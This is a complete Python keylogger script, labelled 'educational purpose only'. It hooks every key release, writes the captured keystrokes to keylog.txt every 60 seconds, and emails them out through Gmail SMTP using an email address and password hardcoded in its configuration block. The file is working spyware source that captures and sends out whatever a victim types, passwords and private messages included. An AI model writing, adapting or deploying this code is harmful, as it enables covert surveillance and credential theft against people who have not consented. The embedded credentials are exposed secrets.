# simple_keylogger_fixed.py
# EDUCATIONAL PURPOSE ONLY – DO NOT USE WITHOUT EXPLICIT CONSENT

import keyboard
import threading
import smtplib
from datetime import datetime
from pathlib import Path

# ---------- CONFIG ----------
LOG_FILE        = Path("keylog.txt")
EMAIL_ADDRESS   = "ezhilan.404@gmail.com"          # set to "you@example.com" to enable email
EMAIL_PASSWORD  = "Ezhil_404"          # app-specific password
REPORT_INTERVAL = 60            # seconds
# ----------------------------

class Keylogger:
    def __init__(self):
        self.log = ""
        self.start_time = datetime.now()
        self.timer = None

    # ----- key handler -----
    def _on_key(self, event):
        name = event.name
        if len(name) > 1:                     # special keys
            name = f"[{name.upper()}]"
        elif name == "space":
            name = " "
        self.log += name

    # ----- periodic report -----
    def _report(self):
        if self.log:
            now = datetime.now()
            entry = f"\n--- [{now}] ---\n{self.log}\n"
            LOG_FILE.write_text(LOG_FILE.read_text(encoding="utf-8") + entry, encoding="utf-8")
            print(f"[{now}] Logged {len(self.log)} chars")

            if EMAIL_ADDRESS:
                self._send_mail(entry)

            self.log = ""

        # schedule next report
        self.timer = threading.Timer(REPORT_INTERVAL, self._report)
        self.timer.start()

    # ----- email helper -----
    def _send_mail(self, body):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS,
                            f"Subject: Keylog {datetime.now()}\n\n{body}")
            server.quit()
        except Exception as e:
            print("Email failed:", e)

    # ----- public API -----
    def start(self):
        print(f"[{datetime.now()}] Keylogger STARTED – press Ctrl+Shift+Q to stop")
        keyboard.on_release(self._on_key)

        # start first report cycle
        self.timer = threading.Timer(REPORT_INTERVAL, self._report)
        self.timer.start()

        # graceful exit hot-key
        keyboard.add_hotkey("ctrl+shift+q", self.stop)

        # keep process alive
        keyboard.wait()          # blocks until hot-key is pressed

    def stop(self):
        print(f"\n[{datetime.now()}] Keylogger STOPPED")
        if self.timer:
            self.timer.cancel()
        keyboard.unhook_all()
        # final flush
        self._report()

if __name__ == "__main__":
    kl = Keylogger()
    try:
        kl.start()
    except KeyboardInterrupt:
        kl.stop()